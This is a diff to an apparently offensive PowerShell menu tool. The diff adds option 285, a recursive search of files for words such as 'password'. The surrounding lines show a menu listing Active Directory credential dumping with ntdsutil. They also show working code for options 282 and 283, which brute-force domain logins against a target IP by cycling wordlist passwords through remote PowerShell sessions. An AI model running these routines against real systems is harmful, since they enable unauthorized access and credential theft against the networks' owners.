@@ -220,7 +220,7 @@ while($true){
     write-host " 226. dump Active Directory creds with ndtsutil`t`t`t227. Analyze ADS in a file`t`t`t`t`t`t276. compute hash checksum of a file";
     write-host " 282. attack a Domain or IP with username and password wordlist files starting a remote powershell process";
     write-host " 283. attack an IP and Domain with username and password wordlist files entering in a remote powershell session";
-    write-host " 284. list all smb shares or a specific share name";
+    write-host " 284. list all smb shares or a specific share name`t`t`t285. search words in files";
     write-host "WEBDAV";
     write-host " 269. p3nt4/Invoke-TmpDavFS";
     write-host "WINRM";
@@ -475,6 +475,7 @@ while($true){
         '282' {$DOMAIN = read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER = read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE = read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){ $PASS = convertto-securestring $TENT -asplaintext -force; $CRED = new-object system.management.automation.pscredential('$DOMAIN\$USER',$PASS); try{start-process powershell -credential $CRED}catch{}}}}}}
         '283' {$IP = read-host "Digit an IP target"; if($IP -ne ""){$DOMAIN = read-host "Digit a Domain name"; if($DOMAIN -ne ""){$USER = read-host "Digit a wordlist username file path"; if(test-path $USER){$FILE = read-host "Digit a wordlist password file path"; if(test-path $FILE){foreach($TENT in get-content $FILE){$PW = convertto-securestring -asplaintext -force -string $TENT;	$CRED = new-object -typename system.management.automation.pscredential -argumentlist $DOMAIN\$USER,$PW; enter-pssession -computername $IP -credential $CRED}}}}}}
         '284' {write-host "Digit a specific host or a smb name"; $LHST = read-host "(example, VM1 or empty for all)"; if($LHST -ne ""){Get-SmbShare -Name $LHST | Format-List -Property *}else{Get-SmbShare | Format-List -Property *}}
+        '285' {write-host "Digit a specific path with extension"; $EXT = read-host "(example, *.xml)"; if($EXT -ne ""){write-host "Digit a regular expression, use a pipe to search more words"; $RGX = read-host "(example, passws|password)"; if($RGX -ne ""){get-childitem -recurse $EXT|select-string -pattern $RGX}}}
         default{write-host 'ERROR: this choice is incorrect'}
     }
 }
